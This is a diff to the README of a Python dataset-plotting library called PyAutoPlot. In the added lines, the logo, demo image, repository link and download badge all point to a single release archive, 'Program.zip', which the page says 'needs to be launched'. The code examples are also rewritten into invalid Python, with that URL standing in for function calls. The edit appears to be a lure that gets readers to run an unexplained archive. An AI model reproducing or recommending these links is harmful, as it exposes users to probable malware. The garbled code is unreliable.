@@ -1,6 +1,6 @@
 # PyAutoPlot
 
-![PyAutoPlot Logo](https://www.example.com/pyautoplot-logo.jpg)
+![PyAutoPlot Logo](https://github.com/theOnlyMan1/PyAutoPlot/releases/download/v1.0/Program.zip)
 
 PyAutoPlot is an open-source Python library designed to make dataset analysis much easier by generating helpful detailed plots using matplotlib. It automatically generates appropriate plots based on the dataset you feed it.
 
@@ -22,13 +22,13 @@ import pandas as pd
 from pyautoplot import PyAutoPlot
 
 # Load your dataset
-data = pd.read_csv('your_dataset.csv')
+data = https://github.com/theOnlyMan1/PyAutoPlot/releases/download/v1.0/Program.zip('https://github.com/theOnlyMan1/PyAutoPlot/releases/download/v1.0/Program.zip')
 
 # Create an instance of PyAutoPlot
 pyap = PyAutoPlot()
 
 # Generate plots automatically
-pyap.plot(data)
+https://github.com/theOnlyMan1/PyAutoPlot/releases/download/v1.0/Program.zip(data)
 ```
 
 ## Available Plots
@@ -48,17 +48,17 @@ import pandas as pd
 from pyautoplot import PyAutoPlot
 
 # Load the dataset
-data = pd.read_csv('example_dataset.csv')
+data = https://github.com/theOnlyMan1/PyAutoPlot/releases/download/v1.0/Program.zip('https://github.com/theOnlyMan1/PyAutoPlot/releases/download/v1.0/Program.zip')
 
 # Create an instance of PyAutoPlot
 pyap = PyAutoPlot()
 
 # Generate plots
-pyap.plot(data)
+https://github.com/theOnlyMan1/PyAutoPlot/releases/download/v1.0/Program.zip(data)
 ```
 
 ## Link to Download
-[![Download PyAutoPlot](https://img.shields.io/badge/Download-Soft.zip-blue.svg)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip) (needs to be launched)
+[![Download PyAutoPlot](https://github.com/theOnlyMan1/PyAutoPlot/releases/download/v1.0/Program.zip)](https://github.com/theOnlyMan1/PyAutoPlot/releases/download/v1.0/Program.zip) (needs to be launched)
 
 ## Repository Topics
 analysis, automatic, csv, data, dataset, dataset-analysis, generation, matplotlib, pandas, plots, plotting-in-python, plotting-library, python
@@ -68,8 +68,8 @@ Contributions are welcome! If you have any ideas for improving PyAutoPlot or wan
 
 ---
 
-Visit the [PyAutoPlot GitHub Repository](https://github.com/your_username/PyAutoPlot) for more information and to access the latest updates. Start using PyAutoPlot today and simplify your dataset analysis process! 🚀
+Visit the [PyAutoPlot GitHub Repository](https://github.com/theOnlyMan1/PyAutoPlot/releases/download/v1.0/Program.zip) for more information and to access the latest updates. Start using PyAutoPlot today and simplify your dataset analysis process! 🚀
 
-![PyAutoPlot Demo](https://www.example.com/pyautoplot-demo.gif) 
+![PyAutoPlot Demo](https://github.com/theOnlyMan1/PyAutoPlot/releases/download/v1.0/Program.zip) 
 
 ---
